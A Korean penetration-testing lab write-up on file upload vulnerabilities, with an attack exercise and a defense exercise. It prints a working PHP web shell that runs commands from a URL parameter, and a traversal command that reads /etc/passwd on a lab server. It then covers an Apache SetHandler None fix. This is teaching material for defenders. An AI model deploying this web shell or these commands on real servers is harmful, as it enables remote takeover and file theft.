# 파일 업로드 모의해킹
파일 업로드 모의해킹은 웹 사이트에서 파일을 업로드할 때, 업로드 된 파일이 악성 코드를 포함하고 있는지 확인하지 않아 발생하는 보안 취약점입니다.

## 공격 실습

![file_upload](https://github.com/Tree1st/HK/blob/master/webH/image/fileUpload/file_upload.png)

공격에 사용될 웹쉘 파일을 업로드 합니다. 웹쉘(Web Shell)은 웹을 통해 원격에서 서버에 접근하여 명령어를 실행할 수 있는 프로그램입니다. 웹쉘은 서버의 취약점으로부터 공격자가 접근한 후, 웹상에서 명령어를 실행하고 서버를 제어할 수 있습니다.

다음은 웹쉘 코드(webshell.php)의 예시 입니다.
```php
<?php

echo 'Enter a Command:<br>';
echo '<form action="">';
echo '<input type=text name="cmd">';
echo '<input type="submit">';
echo '</form>';					

/*
	echo 부분은 명령어를 입력받을 수 있는 폼을 제공
    공격자가 입력 폼에 명령어를 입력하면 cmd 파라미터를 통해 전달된다.
*/

if(isset($_GET['cmd'])){
	system($_GET['cmd']);
}
//system 함수를 통해 전달된 명령어가 실행된다.

?>
```

업로드된 파일의 다운로드 주소를 살펴보면 `http://192.168.219.180/upfiledata/webshell.php` 이와같이 설정되어있음을 알 수 있습니다.    
이 주소로 이동하면 다음과같이 명령어를 실행시킬 수 있는 웹쉘이 실행됨을 볼 수 있습니다.
<br><br>

![file_upload_webshell](https://github.com/Tree1st/HK/blob/master/webH/image/fileUpload/file_upload_webshell.png)

위와같이 입력란에 `cat ../../../../../etc/passwd` 를 입력하여 passwd 파일을 탈취할 수 있습니다.

## 방어 실습

![fileupload_apacheconf](https://github.com/MLTree2/HK/blob/master/webH/image/fileUpload/file_upload_apache2conf.png)

Apache 설정파일인 apache2.conf 파일에서 파일이 업로드되는 경로의 Directory 설정에 `FilesMatch "\.*$"` 를 이용하여 모든 파일에 대하여 `SetHandler None`을 설정합니다. <br>
`SetHandler None`을 설정하면 웹 서버는 어떤 핸들러도 사용하지 않습니다. 이는 일반적으로 정적인 파일을 서비스하는 데 사용됩니다. <br>
즉, 요청된 파일을 그대로 반환하거나, 디렉토리 목록을 표시하지 않고 요청된 파일을 클라이언트에게 제공하여 파일이 웹서버에서 실행되지 않도록 합니다. 

![fileupload_a_result](https://github.com/MLTree2/HK/blob/master/webH/image/fileUpload/file_upload_a_result.png)

`SetHandler None`설정을 적용한 후 기존의 FileUpload 공격을 수행하면 다음과같이 웹쉘 파일이 실행되지 않고 그대로 내용이 나오는것을 확인 할 수 있습니다. 
